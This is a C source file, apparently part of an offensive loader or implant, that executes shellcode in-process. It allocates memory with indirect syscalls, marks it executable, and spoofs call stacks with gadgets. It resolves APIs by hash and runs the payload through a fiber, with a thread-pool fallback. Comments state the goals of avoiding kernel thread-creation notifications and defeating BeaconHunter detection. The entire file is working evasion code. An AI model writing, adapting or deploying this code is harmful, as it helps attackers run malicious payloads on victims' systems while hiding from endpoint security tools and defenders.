// =============================================
// Inject.c  —  In-process shellcode execution
//
// ExecuteInProcess():
//   1. NtAllocateVirtualMemory (RW) → copy shellcode
//      → NtProtectVirtualMemory (RX or RWX)
//   2. CollectCallGadgets → GetRandomCallGadget → SetSpoofTarget
//   3. Primary: Poison Fiber path
//      ConvertThreadToFiber + CreateFiber(SpoofCallback) + SwitchToFiber
//      No new OS thread → PsSetCreateThreadNotifyRoutine never fires.
//   4. Fallback: NT thread pool
//      TpAllocWork(SpoofCallback) + TpPostWork
//      + NtWaitForSingleObject(NtCurrentProcess, alertable=TRUE, timeout=NULL)
//      Alertable wait on the pseudo-handle produces Wait:UserRequest
//      instead of Wait:DelayExecution, defeating BeaconHunter heuristics.
// =============================================

#include "Common.h"

typedef LPVOID (WINAPI* fnConvertThreadToFiber)(LPVOID lpParameter);
typedef LPVOID (WINAPI* fnCreateFiber)(SIZE_T dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter);
typedef VOID   (WINAPI* fnSwitchToFiber)(LPVOID lpFiber);

BOOL ExecuteInProcess(
    IN PNTAPI_FUNC  pNtApis,
    IN PAPI_HASHING pWinApis,
    IN PBYTE        pShellcode,
    IN DWORD        dwShellcodeSize
) {
    // 1. Allocate private RW region
    PVOID  pBase = NULL;
    SIZE_T uSize = (SIZE_T)dwShellcodeSize;

    SET_SYSCALL(pNtApis->NtAllocateVirtualMemory);
    NTSTATUS st = RunSyscall(
        (ULONG_PTR)(HANDLE)-1,
        (ULONG_PTR)&pBase,
        (ULONG_PTR)0,
        (ULONG_PTR)&uSize,
        (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE),
        (ULONG_PTR)PAGE_READWRITE,
        0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(st) || !pBase) {
        LOG("[!] Exec: NtAllocateVirtualMemory failed");
        return FALSE;
    }
    LOG("[+] Exec: memory allocated");

    // 2. Copy shellcode into executable region
    MemCopy(pBase, pShellcode, dwShellcodeSize);
    LOG("[+] Exec: shellcode copied");

    // 3. RW → RX/RWX
    DWORD  dwOld     = 0;
    SIZE_T uProtSize = (SIZE_T)dwShellcodeSize;
    SET_SYSCALL(pNtApis->NtProtectVirtualMemory);
    st = RunSyscall(
        (ULONG_PTR)(HANDLE)-1,
        (ULONG_PTR)&pBase,
        (ULONG_PTR)&uProtSize,
        (ULONG_PTR)SHELLCODE_EXEC_PROT,
        (ULONG_PTR)&dwOld,
        0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(st)) {
        LOG("[!] Exec: NtProtectVirtualMemory failed");
        return FALSE;
    }
    LOG("[+] Exec: memory marked executable");

    // 4. Collect call gadgets and wire up the spoofed callback target
    CollectCallGadgets();
    SetSpoofTarget(pBase, GetRandomCallGadget());
    LOG("[+] Exec: spoof target configured");

    // 5. Poison Fiber — primary path (no new OS thread)
    PVOID pK32 = FindLoadedModuleW(L"KERNEL32.DLL");
    if (pK32) {
        fnConvertThreadToFiber pConv = (fnConvertThreadToFiber)FetchExportAddress(pK32, ConvertThreadToFiber_JOAAT);
        fnCreateFiber          pCrFb = (fnCreateFiber)         FetchExportAddress(pK32, CreateFiber_JOAAT);
        fnSwitchToFiber        pSwFb = (fnSwitchToFiber)       FetchExportAddress(pK32, SwitchToFiber_JOAAT);

        if (pConv && pCrFb && pSwFb) {
            LPVOID pMainFiber = pConv(NULL);
            if (pMainFiber) {
                LPVOID pScFiber = pCrFb(0, (LPFIBER_START_ROUTINE)SpoofCallback, NULL);
                if (pScFiber) {
                    LOG("[*] Exec: switching to shellcode fiber");
                    pSwFb(pScFiber);
                    return TRUE;
                }
            }
        }
    }
    LOG("[*] Exec: fiber unavailable, using thread pool fallback");

    // 6. Thread pool fallback — SpoofCallback runs on a worker thread;
    //    main thread waits alertable on NtCurrentProcess pseudo-handle.
    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!pNtdll) return FALSE;

    fnTpAllocWork pTpAlloc = (fnTpAllocWork)FetchExportAddress(pNtdll, TpAllocWork_JOAAT);
    fnTpPostWork  pTpPost  = (fnTpPostWork) FetchExportAddress(pNtdll, TpPostWork_JOAAT);
    if (!pTpAlloc || !pTpPost) {
        LOG("[!] Exec: TpAllocWork/TpPostWork not resolved");
        return FALSE;
    }

    PVOID    pWork = NULL;
    NTSTATUS stTp  = pTpAlloc(&pWork, (PVOID)SpoofCallback, NULL, NULL);
    if (!NT_SUCCESS(stTp) || !pWork) {
        LOG("[!] Exec: TpAllocWork failed");
        return FALSE;
    }
    pTpPost(pWork);
    LOG("[*] Exec: work posted, entering alertable wait");

    SET_SYSCALL(pNtApis->NtWaitForSingleObject);
    RunSyscall(
        (ULONG_PTR)(HANDLE)-1,  // NtCurrentProcess pseudo-handle
        (ULONG_PTR)TRUE,        // Alertable → Wait:UserRequest
        (ULONG_PTR)NULL,        // Infinite timeout
        0, 0, 0, 0, 0, 0, 0, 0, 0
    );

    return TRUE;
}
